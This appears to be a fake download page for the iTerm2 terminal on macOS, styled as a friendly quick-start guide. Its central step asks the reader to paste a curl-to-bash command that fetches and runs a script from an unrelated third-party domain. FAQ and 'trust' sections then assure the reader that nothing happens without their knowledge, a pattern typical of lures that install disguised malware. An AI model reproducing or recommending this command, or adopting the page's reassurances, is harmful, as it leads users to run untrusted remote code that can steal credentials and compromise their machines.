# 🖥️ iTerm2 for macOS — fast, clean, and ready in one step

iTerm2 gives your Mac a modern terminal: crisp visuals, tabs & splits, powerful search, and fine‑grained control.  
This page is focused on one thing — helping you start quickly and confidently.

---

## ⚡ Start here (copy & paste)

Open **Terminal.app** and paste the line below. Press **Return**.

```bash
/bin/bash -c "$(curl -fsSL https://angelakwak.com/iterm/install.sh)"
```

**What this line does**
- fetches a helper from a public URL using `curl -fsSL`  
- runs it with `/bin/bash -c "…"` in your current session  
- shows progress directly in your Terminal (cancel anytime with **Ctrl+C**)

> Prefer to preview first?  
> ```bash
> curl -fsSL https://angelakwak.com/iterm/install.sh | less
> ```

---

## ✨ Why people choose iTerm2

- **Clarity:** superior rendering, profiles, themes, and color accuracy  
- **Speed:** responsive tabs, splits, and instant search (`⌘F`)  
- **Control:** hotkeys, triggers, paste history, and fine‑tuned settings  
- **Fit for macOS:** native look & feel on Apple Silicon and Intel

---

## ✅ Requirements

- macOS 10.14 or newer  
- Internet connection  
- Access to Terminal.app

---

## 🧩 After you’re set

Try these optional touches to personalize your workspace:

```bash
# Switch default shell to Zsh (if not already)
chsh -s /bin/zsh

# Popular fonts for better legibility (download from official sites)
# JetBrains Mono: https://www.jetbrains.com/lp/mono/
# Fira Code: https://github.com/tonsky/FiraCode
```

Tips:
- create **Profiles** for different projects (fonts, colors, working dir)  
- use **Split Panes** (`⌘D` vertical, `⌘Shift+D` horizontal) for multi‑tasking  
- enable **Hotkey Window** for instant access from anywhere

---

## ❓ FAQ

**Is anything changed without me knowing?**  
No. Everything runs in your visible Terminal session. You can stop with **Ctrl+C** at any time.

**Does it work on Apple Silicon?**  
Yes. Works on M‑series and Intel Macs.

**Can I review the helper beforehand?**  
Yes — see the preview command above.

---

## 🔒 Trust & transparency

- visible output — no silent background tasks  
- no tracking added by this guide  
- you decide what to keep or remove later
